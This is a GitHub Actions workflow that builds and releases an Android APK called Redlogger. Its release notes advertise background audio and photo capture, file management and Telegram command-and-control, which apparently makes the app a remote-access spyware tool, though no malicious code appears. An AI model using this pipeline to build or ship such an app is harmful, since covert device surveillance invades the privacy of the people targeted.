name: Build Android APK

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'

    - name: Set up Java
      uses: actions/setup-java@v3
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Install system dependencies
      run: |
        sudo apt-get update
        # Removed redundant openjdk-17-jdk and curl as they are handled elsewhere or not strictly needed here.
        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses-dev cmake libffi-dev libssl-dev

    # FIX: Added step to verify Git installation
    - name: Verify Git Installation
      run: |
        echo "Verifying git installation..."
        which git
        git --version
        echo "Git verification complete."

    - name: Install Python dependencies
      run: |
        python -m pip install --upgrade pip
        pip install buildozer cython

    - name: Cache Buildozer global directory
      uses: actions/cache@v3
      with:
        path: ~/.buildozer
        key: buildozer-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}

    - name: Cache Buildozer dependencies
      uses: actions/cache@v3
      with:
        path: redlogger_client/.buildozer
        key: buildozer-deps-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}

    - name: Manually install Android SDK cmdline-tools
      run: |
        set -x # Enable shell debugging
        SDK_DIR="$HOME/.buildozer/android/platform/android-sdk"
        CMDLINE_TOOLS_DIR="$SDK_DIR/cmdline-tools"
        LATEST_TOOLS_DIR="$CMDLINE_TOOLS_DIR/latest"

        echo "Creating SDK directories..."
        mkdir -p "$LATEST_TOOLS_DIR"
        ls -l "$SDK_DIR" || true # Use || true to prevent failure if dir doesn't exist yet
        ls -l "$CMDLINE_TOOLS_DIR" || true
        ls -l "$LATEST_TOOLS_DIR" || true

        echo "Downloading command-line tools..."
        curl -L -o "$CMDLINE_TOOLS_DIR/tools.zip" https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
        ls -l "$CMDLINE_TOOLS_DIR"

        echo "Unzipping tools..."
        unzip "$CMDLINE_TOOLS_DIR/tools.zip" -d "$CMDLINE_TOOLS_DIR"
        ls -l "$CMDLINE_TOOLS_DIR"

        echo "Moving extracted tools to 'latest' directory..."
        mv "$CMDLINE_TOOLS_DIR/cmdline-tools/"* "$LATEST_TOOLS_DIR/"
        ls -l "$LATEST_TOOLS_DIR"
        
        echo "Cleaning up zip file and empty directory..."
        rm "$CMDLINE_TOOLS_DIR/tools.zip"
        rmdir "$CMDLINE_TOOLS_DIR/cmdline-tools" # Remove the now empty extracted folder
        ls -l "$CMDLINE_TOOLS_DIR"

        echo "Creating local.properties file..."
        echo "sdk.dir=$SDK_DIR" > "$SDK_DIR/local.properties"
        cat "$SDK_DIR/local.properties"

    - name: Accept Android SDK licenses
      run: |
        SDK_ROOT="$HOME/.buildozer/android/platform/android-sdk"
        SDKMANAGER_PATH="$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager"
        
        echo "Attempting to accept licenses using: $SDKMANAGER_PATH"
        if [ -f "$SDKMANAGER_PATH" ]; then
          yes | "$SDKMANAGER_PATH" --sdk_root="$SDK_ROOT" --licenses
        else
          echo "ERROR: sdkmanager not found at $SDKMANAGER_PATH. Manual installation step likely failed."
          exit 1
        fi

    - name: Build Android APK
      working-directory: redlogger_client
      env:
        ANDROID_HOME: /home/runner/.buildozer/android/platform/android-sdk
        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin:$PATH
      run: |
        buildozer android debug

    - name: List generated APKs
      working-directory: redlogger_client
      run: ls -la bin/

    - name: Upload APK artifact
      uses: actions/upload-artifact@v4
      with:
        name: redlogger-debug-apk
        path: redlogger_client/bin/*.apk

    - name: Create GitHub Release (if tagged)
      if: startsWith(github.ref, 'refs/tags/')
      uses: softprops/action-gh-release@v1
      with:
        files: redlogger_client/bin/*.apk
        name: Redlogger ${{ github.ref_name }}
        body: |
          ## Redlogger Android APK - v${{ github.ref_name }}

          ### ⚠️ Warning
          Use this tool only for authorized testing. Illegal usage is strictly prohibited.

          ### Setup instructions:
          - Install APK on test device
          - Configure Telegram bot token and chat ID
          - (Optional) Configure No-IP domain

          ### Features:
          - Background service
          - Audio/photo capture
          - File management
          - Telegram C2 communication

        draft: false
        prerelease: false
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
